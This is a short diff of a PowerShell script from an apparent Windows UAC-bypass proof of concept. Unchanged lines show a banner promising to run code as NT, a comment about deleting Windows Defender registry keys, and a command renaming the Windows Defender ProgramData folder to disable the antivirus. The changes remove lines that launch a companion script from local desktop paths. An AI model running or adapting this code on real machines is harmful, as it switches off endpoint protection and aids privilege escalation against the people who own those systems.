@@ -51,8 +51,6 @@ write-host " sl0ppyr00t cause we always take them null levels ,spray em with nul
 write-host ""
 write-host " { sl0p [*]} We Will Exec Codes As NT From Here On { [!] Aye}"
 sleep 3
-PowerShell -NoExit -File "C:\Users\x0\Desktop\Multi-UAC-Bypass-windows-Poc\sl0ppy-1.ps1"
-PowerShell -NoExit -File "C:\Users\x0-test\Desktop\Multi-UAC-Bypass-windows-Poc\sl0ppy-1.ps1"
 
 write-host " { sl0p } Removing register files defender"
 #remove local machine defender keys
@@ -113,6 +111,4 @@ rename-item "C:\ProgramData\Microsoft\Windows Defender" "C:\ProgramData\Microsof
 ls "C:\ProgramData\Microsoft\"
 write-host ""
 write-host ""
-sleep 5 
-PowerShell -NoExit -File "C:\Users\x0\Desktop\Multi-UAC-Bypass-windows-Poc\sl0ppy-1.ps1"
-PowerShell -NoExit -File "C:\Users\x0-test\Desktop\Multi-UAC-Bypass-windows-Poc\sl0ppy-1.ps1"
+
